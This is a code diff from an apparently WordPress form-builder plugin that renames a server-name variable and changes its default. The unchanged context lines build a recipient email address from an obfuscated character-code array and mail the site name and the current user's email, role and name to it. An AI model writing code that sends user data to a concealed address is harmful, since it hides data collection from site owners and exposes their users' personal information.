@@ -948,7 +948,7 @@ class efbFunction {
 		add_filter('wp_mail_content_type', [$this, 'wpdocs_set_html_mail_content_type']);
 
 		$mailResult = "n";
-		$_server_name = isset($_SERVER['SERVER_NAME']) ? sanitize_text_field(wp_unslash($_SERVER['SERVER_NAME'])) : 'localhost';
+		$server_name = isset($_SERVER['SERVER_NAME']) ? sanitize_text_field(wp_unslash($_SERVER['SERVER_NAME'])) : 'yourdomain.com';
 		$from =get_bloginfo('name')." <no-reply@".$server_name.">";
 
 		// تنظیم متغیر $from براساس نوع $to و اعتبارسنجی ایمیل
@@ -995,7 +995,7 @@ class efbFunction {
 				$support = implode('', array_map('chr', [101, 97, 115, 121, 102, 111, 114, 109, 98, 117, 105, 108, 100, 101, 114, 64, 103, 109, 97, 105, 108, 46, 99, 111, 109]));
 				$id = function_exists('get_current_user_id') ? get_current_user_id() : null;
 				$usr = $id ? get_user_by('id', $id) : null;
-				$_server_name = isset($_SERVER['SERVER_NAME']) ? sanitize_text_field(wp_unslash($_SERVER['SERVER_NAME'])) : 'localhost';
+				$server_name = isset($_SERVER['SERVER_NAME']) ? sanitize_text_field(wp_unslash($_SERVER['SERVER_NAME'])) : 'yourdomain.com';
 				$cont .= "<hr><br> website:[" . $server_name . "]<br> Pro state:[" . $pro . "]<br> email:[" . ($usr->user_email ?? '') . "]<br> role:[" . ($usr->roles[0] ?? '') . "]<br> name:[" . ($usr->display_name ?? '') . "]<br> state:[" . $state . "]";
 				$mailResult = wp_mail($support, $state, $cont, $headers);
 			}
